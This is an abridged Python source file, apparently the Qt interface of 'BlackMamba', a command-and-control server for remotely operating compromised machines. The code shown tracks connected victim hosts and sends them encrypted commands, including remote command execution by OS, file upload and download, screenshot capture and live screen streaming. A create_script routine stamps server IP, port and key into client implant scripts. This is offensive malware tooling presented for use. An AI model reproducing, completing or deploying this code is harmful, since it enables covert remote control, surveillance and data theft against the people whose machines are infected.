...
import files_rc
from bin.config import PORT, PORT_VIDEO, SERVER_IP
...
class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        ...
        icon2 = QIcon()
        icon2.addFile(":/16x16/icons/16x16/cil-x.png", QSize(), QIcon.Normal, QIcon.Off)
        ...
        self.btn_new_user2.setObjectName("btn_new_user2")
        sizePolicy4 = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        sizePolicy4.setHorizontalStretch(0)
        sizePolicy4.setVerticalStretch(0)
        sizePolicy4.setHeightForWidth(
            self.btn_new_user2.sizePolicy().hasHeightForWidth()
        )
        ...
        self.btn_new_user2.setStyleSheet(
            "QPushButton {	\n"
        ...
        sizePolicy4.setVerticalStretch(0)
        sizePolicy4.setHeightForWidth(
            self.btn_new_user.sizePolicy().hasHeightForWidth()
        )
        ...
        self.btn_new_3.setObjectName("btn_new_3")
        ...
        self.btn_new_4.setObjectName("btn_new_4")
        ...
        icon3 = QIcon()
        icon3.addFile(
            ":/16x16/icons/16x16/cil-save.png", QSize(), QIcon.Normal, QIcon.Off
        )
        ...
        self.labelVersion_4.setAlignment(
        ...
        self.verticalSpacer_1 = QSpacerItem(
            7, 7, QSizePolicy.Minimum, QSizePolicy.Fixed
        )
        ...
        self.lineEdit_2.setPlaceholderText(
            QCoreApplication.translate(
                "MainWindow", "Ex: C:/Users/User/Documents", None
            )
        )
        self.lineEdit_7.setPlaceholderText(
            QCoreApplication.translate("MainWindow", "SERVER IP", None)
        )
        self.lineEdit_6.setPlaceholderText(
            QCoreApplication.translate("MainWindow", "PORT", None)
        )
        self.lineEdit_5.setPlaceholderText(
            QCoreApplication.translate("MainWindow", "VIDEO PORT", None)
        )
        ...
        self.shell_help = [
            '-exec "<command>" -os <os_name>         Executes a command by os type.',
        ...
        self.label_22.setText(
            'Blackmamba C2 Terminal. For more information type "-help".\n'
        )
            ...
            for e in self.clients:
                try:
                    ...
                    if os_selected in str(hinfo[4]).lower():
                        ...
                        with open(
                            f'bin/request/transfer/stdin/{tag_host.replace("tag:", "")}',
                            "w",
                        ) as set_output:
                        ...
                        with open(
                            f'bin/request/transfer/execute/{tag_host.replace("tag:", "")}',
                            "w",
                        ) as set_execute:
    ...
    def create_script(self):
        ...
        script = body_script
        script = script.replace("SERVER_IP", f"{server_ip}").replace(
            "SERVER_PORT", f"{server_port}"
        )
        script = script.replace("SERVER_V_IP", f"{server_v_port}").replace(
            "SERVER_KEY", f"{crypt_key}"
        )
    ...
    def clientHandler(self, c, addr, system):
        ...
        while True:
            ...
            try:
                exec(
                    f"global checkpoint; global data; data = tag_{system[2]}_send; checkpoint = data"
                )
                if "True" in execute:
                    # self.stop_hello = True

                    with open(
                        f"bin/request/transfer/stdin/{system[2]}", "r"
                    ) as get_stdin:
                        data = get_stdin.read()
                        get_stdin.close()

                    with open(
                        f"bin/request/transfer/stdin/{system[2]}", "w"
                    ) as clear_stdin:
                        clear_stdin.write("")
                        clear_stdin.close()
                    ...
                    if "%sv-init-live-video%" in data:
                        ...
                        thread_stm = threading.Thread(
                            target=self.start_stm_screen, args=()
                        )
                        thread_stm.daemon = True
                        thread_stm.start()

                        with open(
                            f"bin/request/transfer/execute/{system[2]}", "w"
                        ) as set_execute:
                            set_execute.write("False")
                            set_execute.close()

                        with open(
                            f"bin/request/transfer/stdout/{system[2]}", "w"
                        ) as set_output:
                            set_output.write("")
                            set_output.close()
                    ...
                    if "%get-screenshot%" in data:
                        ...
                        try:
                            ...
                            try:
                                os.remove(
                                    f"bin/resources/cache/screenshot_{system[2]}.png"
                                )
                            except:
                                pass

                            f = open(
                                f"bin/resources/cache/screenshot_{system[2]}.png", "wb"
                            )
                            c.settimeout(15)
                            ...
                            with open(
                                f"bin/resources/cache/screenshot_{system[2]}.png", "rb"
                            ) as f:
                                content_crypt_img = f.read()
                                f.close()

                            content_crypt_img = self.decrypt(
                                content_crypt_img, f"{server_key}"
                            )
                    ...
                    if data.startswith("-fget"):
                        ...
                        command_crypt = self.crypt(
                            f"[FGET]{client_side}", f"{server_key}"
                        )
                        c.send(str(command_crypt).encode())
                    ...
                    if data.startswith("-fput"):
                        ...
                        try:
                            ...
                            with open(
                                ...
                                set_output.write(
                                    "Error: An error has occurred with the file.\n"
                                )
                                set_output.close()
                        ...
                        command_crypt = self.crypt(
                            f"[FPUT]{client_side}", f"{server_key}"
                        )
                        c.send(str(command_crypt).encode())
                        time.sleep(5)
                    ...
                    ######################## COMMAND LINE ############################
                        ...
                        try:
                            decrypt_data = self.decrypt(
                                bytes(data_string, encoding="utf-8"), f"{server_key}"
                            )
                        except:
                            decrypt_data = b"None"
            ...
            try:
                with open(
                    f"bin/request/transfer/execute/{system[2]}", "r"
                ) as set_execute:
    ...
    def start_stm_screen(self):
        ...
        if "linux" in str(platform.platform()).lower():
            try:
                os.system(
                    f"sudo {python_v} {dir_path}/vstrm_server.py {SERVER_IP} {PORT_VIDEO}"
                )
            except:
                pass
    ...
    def search_host(self):
        for i in range(9999):
            ...
            with open(
                f'bin/hosts/{system_info_list[1].replace("tag:","")}.txt', "w"
            ) as put_host:
            ...
            with open(
                f'bin/request/transfer/execute/{system_info_list[1].replace("tag:","")}',
                "w",
            ) as put_host:
            ...
            with open(
                f'bin/request/transfer/stdout/{system_info_list[1].replace("tag:","")}',
                "w",
            ) as put_host:
                put_host.write(f"")
                put_host.close()
            ...
            with open(
                f'bin/request/transfer/stdin/{system_info_list[1].replace("tag:","")}',
                "w",
            ) as put_host:
                put_host.write(f"")
                put_host.close()
    ...
    def add_hosts(self):
        ...
        for links in file_list:
            ...
            exec(
                f"global commandLinkButton_{number}; commandLinkButton_{number} = QCommandLinkButton(self.scrollAreaWidgetContents_2)"
            )
            exec(f"global btnh; btnh = commandLinkButton_{number}")
            btnh.setObjectName("commandLinkButton_x")
            ...
            if (links.replace(".txt", "")) in str(self.clients):
                exec(
                    f'icon4.addFile(u":/24x24/icons/24x24/status_on.png", QSize(), QIcon.Normal, QIcon.Off)'
                )
            else:
                exec(
                    f'icon4.addFile(u":/24x24/icons/24x24/status_off.png", QSize(), QIcon.Normal, QIcon.Off)'
                )
    ...
    def retranslateUi(self, MainWindow):
        ...
        self.label_title_bar_top.setText(
            QCoreApplication.translate("MainWindow", "BlackMamba", None)
        )
        ...
        self.btn_new_user.setText(
            QCoreApplication.translate("MainWindow", "Hosts", None)
        )
        self.btn_save_2.setText(
            QCoreApplication.translate("MainWindow", "Console", None)
        )
        self.btn_save_2.setText(
            QCoreApplication.translate("MainWindow", "C2 Terminal", None)
        )
        self.btn_new_3.setText(
            QCoreApplication.translate("MainWindow", "New Host", None)
        )
        self.btn_new_4.setText(QCoreApplication.translate("MainWindow", "Help", None))
        self.btn_new_user2.setText(
        ...
        self.label_7.setText(
            QCoreApplication.translate("MainWindow", "Page Index 0", None)
        )
        self.labelBoxBlenderInstalation.setText(
            QCoreApplication.translate("MainWindow", "Create script", None)
        )
        ...
        self.labelVersion_4.setText(QCoreApplication.translate("MainWindow", "", None))
        # self.plainTextEdit.setPlainText(QCoreApplication.translate("MainWindow", u"BlackMamba\n"
        # "\n"
        # "", None))
        # self.lineEdit_3.setPlaceholderText("")
        self.label_credits.setText(
            QCoreApplication.translate("MainWindow", "BlackMamba by Loseys", None)
        )
        self.label_version.setText(
            QCoreApplication.translate("MainWindow", "v1.0.41", None)
        )
